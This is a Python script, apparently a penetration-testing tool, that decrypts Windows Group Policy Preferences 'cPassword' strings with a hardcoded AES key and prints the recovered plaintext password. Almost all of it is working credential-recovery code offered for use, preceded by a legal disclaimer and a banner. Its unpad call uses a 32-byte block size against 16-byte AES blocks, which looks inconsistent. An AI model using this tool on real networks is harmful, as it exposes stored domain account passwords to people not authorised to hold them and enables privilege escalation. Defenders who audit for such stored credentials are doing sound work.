# cPassword Decryption Tool.
# Copyright (C) 2021 athanasios.mitragkas@gmail.com
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.

from Crypto.Cipher import AES
from base64 import b64decode
from Crypto.Util.Padding import unpad
import argparse

def decode(cpassword):
    iv = 16*b'\x00'
    ct = bytes(b64decode(cpassword+'==='))
    key = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), 32).decode('utf-8').replace('\x00', '')
    return pt


print("""
     ______              ______                           _   
     | ___ \             |  _  \                         | |  
  ___| |_/ /_ _ ___ ___  | | | |___  ___ _ __ _   _ _ __ | |_ 
 / __|  __/ _` / __/ __| | | | / _ \/ __| '__| | | | '_ \| __|
| (__| | | (_| \__ \__ \ | |/ /  __/ (__| |  | |_| | |_) | |_ 
 \___\_|  \__,_|___/___/ |___/ \___|\___|_|   \__, | .__/ \__|
                                               __/ | |        
                                              |___/|_|        
     Made By: @sAsPeCt, @wizzard_alfredo
""")

parser = argparse.ArgumentParser()
parser.add_argument("cPassword")
args = parser.parse_args()
try:
    decrypted = decode(args.cPassword)
    print(f"[+] Decrypted Password: {decrypted}")
except:
    print("[-] Invalid cPassword")
